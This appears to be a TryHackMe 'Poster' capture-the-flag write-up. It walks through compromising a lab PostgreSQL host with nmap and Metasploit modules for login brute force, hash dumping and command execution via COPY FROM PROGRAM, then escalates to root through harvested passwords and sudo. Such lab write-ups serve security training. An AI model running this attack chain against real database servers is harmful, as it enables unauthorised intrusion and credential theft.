# Try Hack Me - Poster
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 360 
# Vulnerabilities: Default credentials, RCE, vulnerable postgresqp version

# Phase 1 - Reconnaissance:

nmap scan:
```bash
nmap -sV -sC <target_ip>
```

PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

5432/tcp open  postgresql

we have the answer to the 1st and the 2nd task. now since the entire ctf revolves around the rdbms we will focus on enumerating only the port 5432 which runs the rdbms.

for this ctf we will use metasploit modules to get the information related to the rdbms system.

```bash
#first start metasploit
msfconsole
```
now according to the tasks we will use the modules respectively. we directly search for all the postgreql exploit modules available on metasploit. since you will find all the modules with one search, we will be using only two of them for the actual exploitation, and the rest which are required for the tasks to just answer them.

```bash
search postgresql
```
this will display all the modules based on enumerating the postgresql of the versions which are vulnerable.

```bash
use auxiliary/scanner/postgres/postgres_login
```
this module will enumerate the username and the password by using bruteforce.

we can find the username and password once we set the appropriate options for the module

```bash
set RHOSTS <target_ip> 
set RPORT 5432 #if not set to 5432 by default
```
now we will be using the password and username to dump all the hashes and execute commands remotely.

now the answer to the 6th question will be as follows

```bash
use auxiliary/scanner/postgres/postgres_sql
```
by using this module we find the exact version of the postgresql used in this rdbms system. (remember to set the required options every time you use a different module)

```bash
set username <username_found_in_question4>
set PASSWORD <password_found_in_question4>
```

now we use the hashdump module to get the number of users whose hashdump we can get from the system

```bash
use auxiliary/scanner/postgres/postgres_hashdump
```

we will set the options again and find out the number of users whose hashdump we find on the system which will answer the question no. 9. now we will answer the 10th question with this module

```bash
auxiliary/admin/postgres/postgres_readfile
```
we wont be requiring this module since it is not relevant in getting an initial foothold. instead we will use the module which will grant us a shell on the system with a good tty

# Phase 2 - Initial Foothold:
```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

we enter the RHOSTS, USERNAME, PASSWORD once again and then hit on exploit

```bash
exploit
```
this will grant us a shell with a terrible tty to instead we will find a way to get access to a more privileged user on the system and try to find if their credentials exist on this system or not. after doing some manual enumeration we find out that there exists a credential.txt at the /home/dark directory which contains the password of the user dark. we login via ssh

```bash
ssh dark@<targte_ip>
```
we have a shell as dark! now lets run linpeas on the system to find any hidden files or any processes that can help us escalate privileges horizontally. after running linpeas on the system, i find out that there exists a /var/www/html/config.php which contains the password of some database user. often in ctfs, the database password belongs to the user with the higher privileges on the system which is clearly alison. so we use su alison and enter the password when prompted

```bash
su alison
#enter the password after prompted
```
we have a shell as alison. now lets find out what commands this user can execute as root.

```bash
sudo -l
```
User alison may run the following commands on ubuntu:
   
 (ALL : ALL) ALL

well i expected more from this room but since it is a boot2root ctf we will get a root shell within one command

```bash
sudo bash
```
we have the root shell. we read and submit the user.txt and root.txt flags
